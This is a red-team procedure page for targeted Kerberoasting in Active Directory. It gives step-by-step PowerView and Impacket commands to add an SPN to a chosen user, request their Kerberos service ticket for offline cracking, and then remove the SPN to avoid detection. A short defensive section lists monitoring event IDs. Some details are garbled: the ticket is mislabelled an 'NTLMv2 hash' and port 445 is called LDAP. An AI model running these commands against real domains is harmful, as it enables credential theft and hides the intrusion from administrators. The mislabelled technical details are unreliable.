---
id: 9c74b3a0-789c-4453-94e4-a94d643be853
name: Add-SPN-to-Domain-User-and-Kerberoast-for-NTLMv2-Hash
type: procedure
verified: true
submitted: false
created_at: '2020-06-25T20:16:48.145931+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Kerberoasting|T1558.003 - Kerberoasting]]'
sub_techniques: []
tags:
  - kerberoast
  - active-directory
  - credential-access
commands:
  - '[[commands/create-windows-pscredential-object]]'
  - >-
    [[commands/getuserSPNs-py-query-domain-for-spns-and-retrieve-users-ntlmv2-hash]]
  - '[[commands/powerview-add-spn-to-domain-user]]'
  - '[[commands/powerview-remove-spn-to-domain-user]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerView]]'
  - '[[tools/Impacket]]'
validated: true
---

# Add-SPN-to-Domain-User-and-Kerberoast-for-NTLMv2-Hash

## Summary

This procedure demonstrates how to add a Service Principal Name (SPN) to an Active Directory domain user account using PowerView, enabling the retrieval of the user's NTLMv2 hash via Kerberoasting with Impacket's GetUserSPNs.py. It requires domain credentials with permissions to modify user objects, and once the SPN is added, any domain user can request the ticket for offline cracking. This technique is useful in red team engagements for credential harvesting in Active Directory environments.

## Description

Kerberoasting involves requesting service tickets for accounts with SPNs and cracking the encrypted portions offline to recover passwords. By default, service accounts have SPNs, but adding an SPN to a regular user account exposes their hash to any authenticated domain user. This procedure uses PowerShell's PowerView module to modify the target user's SPN attribute and Impacket to perform the roasting. The process assumes the attacker has initial domain access with modification privileges (e.g., via a compromised admin account). After adding the SPN, the TGS ticket is requested and output in a crackable format like Hashcat mode 13100. Optionally, the SPN is removed to cover tracks. This targets Windows Active Directory domains and requires network access to a Domain Controller.

## Requirements

1. Domain credentials with permissions to modify user objects (e.g., member of Account Operators or delegated rights).
2. Network access to the Domain Controller (ports 88/TCP for Kerberos, 445/TCP for LDAP if using PowerView over RPC).
3. PowerView.ps1 downloaded and imported on a Windows host with PowerShell execution policy allowing scripts.
4. Impacket suite installed on a Linux host (e.g., Kali) for GetUserSPNs.py.
5. Target domain details: domain name, DC IP, target user identity.

## Defense

- Monitor Active Directory for unauthorized changes to user attributes like servicePrincipalName using tools like Microsoft ATA or custom auditing on the Security event log (Event ID 5136 for directory service object modifications).
- Implement least privilege: Restrict SPN modifications to service accounts only and audit delegated permissions.
- Enable Kerberos logging on Domain Controllers to detect unusual TGS requests (Event ID 4769).
- Use protected users group for high-value accounts to prevent delegation and roasting.
- Deploy endpoint detection for PowerShell script execution (e.g., AMSI) and network monitoring for Impacket traffic.

## Objectives

1. Add an SPN to a target domain user to make their hash roastable.
2. Request and extract the Kerberos TGS ticket containing the NTLMv2 hash.
3. Optionally remove the SPN to avoid detection.
4. Obtain a crackable hash for offline password recovery.

## Instructions

### Step 1: Download and Import PowerView

**Context**: PowerView is required for Active Directory modifications. Download the script from the official repository and import it into your PowerShell session to enable cmdlets like Set-DomainObject.

Download PowerView.ps1 from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 and save it locally. Then import:

```powershell
. .\PowerView.ps1
```

> This loads the module. Verify by running Get-Command Set-DomainObject, which should return the cmdlet details if successful.

### Step 2: Create PSCredential Object

**Context**: If the current session lacks the necessary privileges, create a PSCredential object with admin credentials to authenticate the PowerView operations. This step is optional if running as a privileged user.

**Command** ([[commands/create-windows-pscredential-object]]):

```powershell
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
```

> This creates a secure credential object usable with -Credential parameters. Expected output is a PSCredential object; no console output, but $Cred can be inspected with $Cred.UserName.

### Step 3: Add SPN to Target User

**Context**: Use PowerView to set an SPN on the target user, making their account eligible for Kerberoasting. The SPN value can be arbitrary (e.g., 'nonexistent/domain') as long as it's unique.

**Command** ([[commands/powerview-add-spn-to-domain-user]]):

```powershell
Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET @{serviceprincipalname='nonexistent/$_DOMAIN'}
```

> This modifies the user's servicePrincipalName attribute. Expected output: Confirmation like "Object modified successfully" or details of the change. Verify with Get-DomainUser -Identity $_TARGET_USER | Select serviceprincipalname.

### Step 4: Kerberoast the Target User

**Context**: With the SPN added, use Impacket's GetUserSPNs.py from a Linux host to request the TGS ticket for the target user and extract the hash. This simulates an attacker with domain creds performing the roast.

**Command** ([[commands/getuserSPNs-py-query-domain-for-spns-and-retrieve-users-ntlmv2-hash]]):

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request -request-user $_TARGET_USER
```

> This queries the DC for the SPN and requests the ticket, outputting the hash in $krb5tgs$ format. Save the output to a file for cracking with Hashcat. Expected output includes the SPN details and the full hash string.

### Step 5: Remove SPN from Target User

**Context**: To clean up and reduce detection risk, remove the added SPN using PowerView. This step is optional but recommended post-exploitation.

**Command** ([[commands/powerview-remove-spn-to-domain-user]]):

```powershell
Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -Clear serviceprincipalname
```

> This clears the servicePrincipalName attribute. Expected output: Confirmation of modification. Verify with Get-DomainUser to ensure no SPN remains.
